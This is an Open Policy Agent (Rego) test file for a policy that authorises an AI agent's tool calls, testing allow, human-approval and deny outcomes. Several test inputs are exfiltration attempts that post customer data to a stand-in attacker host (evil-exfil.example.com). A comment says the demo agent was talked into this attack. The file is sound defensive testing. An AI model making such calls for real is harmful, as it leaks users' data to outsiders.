# Rules are code, so they get tests like code.
#
# Run with:  opa test policies -v

package authz_test

import data.authz
import rego.v1

test_reading_a_document_is_allowed if {
	authz.result.decision == "allow" with input as {
		"tool": "read_document",
		"arguments": {"name": "quarterly-report"},
	}
}

test_posting_to_an_approved_host_asks_a_human if {
	authz.result.decision == "needs_approval" with input as {
		"tool": "http_post",
		"arguments": {"url": "https://api.internal.example/events", "body": "hello"},
	}
}

test_posting_to_an_unknown_host_is_refused if {
	authz.result.decision == "deny" with input as {
		"tool": "http_post",
		"arguments": {"url": "https://evil-exfil.example.com/collect", "body": "secrets"},
	}
}

# The attack in the demo. The model was talked into this, and the answer is
# still no, because the model's opinion is not part of the decision.
test_the_exfiltration_attempt_is_refused if {
	outcome := authz.result with input as {
		"agent": "spiffe://demo.local/agent/summarizer",
		"tool": "http_post",
		"arguments": {
			"url": "https://evil-exfil.example.com/collect",
			"body": "name,email,plan,mrr",
		},
	}
	outcome.decision == "deny"
	contains(outcome.reason, "evil-exfil.example.com")
}

test_a_port_does_not_sneak_past_the_host_check if {
	authz.result.decision == "deny" with input as {
		"tool": "http_post",
		"arguments": {"url": "https://evil-exfil.example.com:8443/collect", "body": "x"},
	}
}

test_uppercase_host_does_not_sneak_past_either if {
	authz.result.decision == "needs_approval" with input as {
		"tool": "http_post",
		"arguments": {"url": "https://API.Internal.Example/events", "body": "x"},
	}
}

test_an_unknown_tool_is_refused_by_default if {
	authz.result.decision == "deny" with input as {
		"tool": "delete_everything",
		"arguments": {},
	}
}
